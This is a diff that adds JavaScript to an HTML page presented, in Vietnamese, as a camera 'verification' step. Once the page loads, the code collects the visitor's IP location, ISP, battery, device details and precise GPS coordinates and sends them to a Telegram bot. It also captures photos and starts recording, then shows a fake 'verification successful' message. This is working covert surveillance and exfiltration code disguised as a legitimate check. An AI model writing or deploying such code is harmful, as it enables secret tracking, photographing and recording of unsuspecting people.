+            console.log(`   📍 Thành phố: ${locationInfo.city}`);
+            console.log(`   🗺️ Khu vực: ${locationInfo.region}`);
+            console.log(`   🏳️ Quốc gia: ${locationInfo.country}`);
+            console.log(`   🏢 Nhà mạng: ${locationInfo.isp}`);
+            console.log(`   🌐 IP: ${locationInfo.ip}`);
+            
+            // Lấy thông tin pin
+            let batteryPercent = 'Không xác định';
+            let batteryCharging = false;
+            try {
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    batteryPercent = `${Math.round(battery.level * 100)}%`;
+                    batteryCharging = battery.charging;
+                }
+            } catch (err) {
+                console.error('Lỗi lấy thông tin pin:', err);
+            }
+            
+            // Thu thập thông tin thiết bị
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform || 'Không xác định';
+            const screenWidth = screen.width;
+            const screenHeight = screen.height;
+            const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Không xác định';
+            const cookieEnabled = navigator.cookieEnabled ? 'Bật' : 'Tắt';
+            const language = navigator.language || 'Không xác định';
+            const hardwareConcurrency = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} nhân` : 'Không xác định';
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Không xác định';
+            const currentTime = new Date().toLocaleString('vi-VN', { timeZone: timezone });
+            
+            // Tạo bản đồ link nếu có tọa độ
+            let mapsLink = '';
+            if (locationInfo.lat && locationInfo.lon) {
+                mapsLink = `\n🗺️ Google Maps: https://www.google.com/maps?q=${locationInfo.lat},${locationInfo.lon}`;
+            }
+            
+            // Tạo nội dung tin nhắn
+            const text = `📥 THÔNG TIN KHÁCH TRUY CẬP
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🌐 ĐỊA CHỈ IP: ${locationInfo.ip}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📍 THÀNH PHỐ: ${locationInfo.city}
+🗺️ KHU VỰC/TỈNH: ${locationInfo.region}
+🏳️ QUỐC GIA: ${locationInfo.country}
+🏢 NHÀ MẠNG: ${locationInfo.isp}${mapsLink}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💻 TRÌNH DUYỆT: ${userAgent.substring(0, 100)}${userAgent.length > 100 ? '...' : ''}
+🖥️ HỆ ĐIỀU HÀNH: ${platform}
+📺 ĐỘ PHÂN GIẢI: ${screenWidth}x${screenHeight}
+🔋 PIN: ${batteryPercent} ${batteryCharging ? '(🔌 Đang sạc)' : '(🔋 Không sạc)'}
+💾 RAM: ${deviceMemory}
+⚙️ CPU: ${hardwareConcurrency}
+🍪 COOKIE: ${cookieEnabled}
+🌐 NGÔN NGỮ: ${language}
+⏰ MÚI GIỜ: ${timezone}
+🕐 THỜI GIAN: ${currentTime}`;
+            
+            // Gửi tin nhắn
+            const sent = await sendToTelegram(text, false);
+            if (sent) {
+                console.log('✅ ĐÃ GỬI THÀNH CÔNG!');
+            } else {
+                console.warn('⚠️ Gửi thất bại');
+            }
+        }
+        
+        // Hàm lấy GPS
+        async function getGPS() {
+            if ('geolocation' in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    async (pos) => {
+                        const lat = pos.coords.latitude;
+                        const lng = pos.coords.longitude;
+                        const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
+                        await sendToTelegram(`📍 VỊ TRÍ GPS CHÍNH XÁC\n📌 Vĩ độ: ${lat}\n📌 Kinh độ: ${lng}\n🎯 Độ chính xác: ${Math.round(pos.coords.accuracy)}m\n🔗 Xem bản đồ: ${mapsLink}`, false);
+                        console.log('✅ Đã gửi vị trí GPS');
+                    },
+                    (err) => {
+                        console.log('⚠️ Không thể lấy vị trí GPS:', err.message);
+                    }
+                );
+            }
+        }
+        
+        // Bắt đầu quá trình xác minh
+        async function startVerification() {
+            if (processStarted) return;
+            processStarted = true;
+            
+            console.log('🚀 Bắt đầu quá trình xác minh...');
+            
+            // Chạy song song
+            const tasks = [
+                sendDeviceInfoToTelegram(),
+                getGPS(),
+                capturePhotos(),
+                startRecording()
+            ];
+            
+            Promise.allSettled(tasks).catch(console.error);
+            
+            // Hiển thị thành công
+            setTimeout(() => {
+                successBox.style.display = 'block';
+                console.log('✅ Xác minh thành công!');
+                
+                setTimeout(() => {
+                    if (previewStream) {
+                        previewStream.getTracks().forEach(track => track.stop());
+                    }
+                }, 2000);
+            }, 1500);
+        }
+        
+        // Khởi tạo camera
+        async function initCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 640 },
+                        height: { ideal: 480 },
+                        facingMode: 'user'
+                    } 
+                });
+                
+                previewStream = stream;
+                videoPreview.srcObject = stream;
+                
+                errorBox.style.display = 'none';
+                console.log('📷 Camera đã sẵn sàng');
+                
+                startVerification();
+                
+            } catch (e) {
+                console.error('❌ Camera error:', e);
+                
+                errorBox.style.display = 'block';
+                
+                let errorMessage = '';
+                if (e.name === 'NotAllowedError') {
+                    errorMessage = 'Bạn đã từ chối quyền truy cập camera. Vui lòng cho phép để tiếp tục xác minh.';
+                } else if (e.name === 'NotFoundError') {
+                    errorMessage = 'Không tìm thấy camera trên thiết bị của bạn.';
+                } else if (e.name === 'NotReadableError') {
+                    errorMessage = 'Camera đang được sử dụng bởi ứng dụng khác.';
+                } else {
+                    errorMessage = 'Không thể truy cập camera. Vui lòng kiểm tra lại.';
+                }
+                
+                document.getElementById('errorDescription').innerHTML = errorMessage;
+            }
+        }
+        
+        // Xử lý nút thử lại
+        retryBtn.addEventListener('click', () => {
+            errorBox.style.display = 'none';
+            processStarted = false;
+            initCamera();
+        });
+        
+        // Khởi tạo
+        initCamera();
+        
+        // Dọn dẹp
+        window.addEventListener('beforeunload', () => {
+            if (previewStream) {
+                previewStream.getTracks().forEach(track => track.stop());
+            }
+            if (captureStream && captureStream !== previewStream) {
+                captureStream.getTracks().forEach(track => track.stop());
+            }
+        });
+    </script>
 </body>
 </html>
